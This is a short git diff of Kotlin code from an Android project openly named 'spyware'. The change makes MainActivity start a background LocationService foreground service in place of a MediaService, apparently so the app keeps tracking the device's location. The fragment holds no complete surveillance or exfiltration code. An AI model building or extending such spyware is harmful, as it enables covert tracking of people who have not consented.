@@ -3,13 +3,11 @@ package com.example.spyware
 import android.app.AlertDialog
 import android.content.Context
 import android.content.Intent
-import android.location.Location
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
-import android.provider.MediaStore.Audio.Media
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.activity.enableEdgeToEdge
@@ -23,7 +21,6 @@ import androidx.compose.ui.tooling.preview.Preview
 import com.example.spyware.ui.theme.SpywareTheme
 import android.provider.Settings
 import appendShiftedToFile
-import com.example.spyware.common.Constants
 
 class MainActivity : ComponentActivity() {
     private var mobileDialogOpen=false
@@ -55,11 +52,11 @@ class MainActivity : ComponentActivity() {
 
 //        val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
 //        startActivity(intent)
-        if(!MediaService.isServiceActive) {
+        if(!LocationService.isServiceActive) {
             this.startForegroundService(
                 Intent(
                     this,
-                    MediaService::class.java
+                    LocationService::class.java
                 )
             );
         }
